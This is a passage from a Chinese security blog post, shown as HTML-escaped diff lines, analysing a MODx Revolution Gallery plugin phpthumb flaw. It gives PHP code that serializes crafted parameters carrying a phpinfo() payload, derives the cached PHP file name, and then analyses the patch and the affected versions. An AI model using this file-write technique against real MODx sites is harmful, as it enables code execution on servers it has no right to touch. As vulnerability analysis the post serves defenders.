-&lt;p&gt;然后写一段代码来生成反序列化数据，此处要注意参数顺序，不同顺序生成的反序列化数据不一样，最终的MD5值也就会变&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$target = array (
-    &amp;quot;action&amp;quot;=&amp;gt; &amp;quot;web/phpthumb&amp;quot;,
-    &amp;quot;src&amp;quot;=&amp;gt; &amp;quot;http&amp;quot;,
-    &amp;quot;f&amp;quot;=&amp;gt; &amp;quot;php&amp;quot;,
-    &amp;quot;useRawIMoutput&amp;quot;=&amp;gt; &amp;quot;1&amp;quot;,
-    &amp;quot;config_prefer_imagemagick&amp;quot;=&amp;gt; &amp;quot;0&amp;quot;,
-    &amp;quot;IMresizedData&amp;quot;=&amp;gt; &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
-);
-$seri = serialize($target);  
-echo md5($seri);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;最终会在缓存目录&lt;code&gt;assets/components/gallery/cache&lt;/code&gt;写入文件&lt;code&gt;http.f23566b3b11f5fd29a8189b74ef53daf.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532601619133.png&#34; alt=&#34;1532601619133&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x04-补丁分析&#34;&gt;0x04 补丁分析&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/modxcms/revolution/pull/13979/&#34;&gt;https://github.com/modxcms/revolution/pull/13979/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532602450085.png&#34; alt=&#34;1532602450085&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;补丁主要是对可传入的参数进行了限制，只允许公共参数(public parameters)，这样就避免了直接传入私有参数改变程序逻辑。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
-
-&lt;p&gt;该漏洞的利用条件虽然有一定版本和插件限制，但是在互联网上&lt;code&gt;Gallery&lt;/code&gt;插件的使用量并不小，相关站点需要多加防范。&lt;/p&gt;
-
-&lt;p&gt;此次漏洞应该归结于&lt;code&gt;phpthumb&lt;/code&gt;模块，一是接口直接对外暴露，二是对文件操作缺少过滤。在&lt;code&gt;MODx&lt;/code&gt;中的两个版本均受到影响，分别是 &lt;code&gt;1.7.14-201604151303&lt;/code&gt;和&lt;code&gt;1.7.14-201608101311&lt;/code&gt; ，在&lt;code&gt;Github&lt;/code&gt;上搜索了几个使用该库的&lt;code&gt;CMS&lt;/code&gt;，发现代码结构几乎一致，不排除也能直接利用的情况，有兴趣的可以研究一下。&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
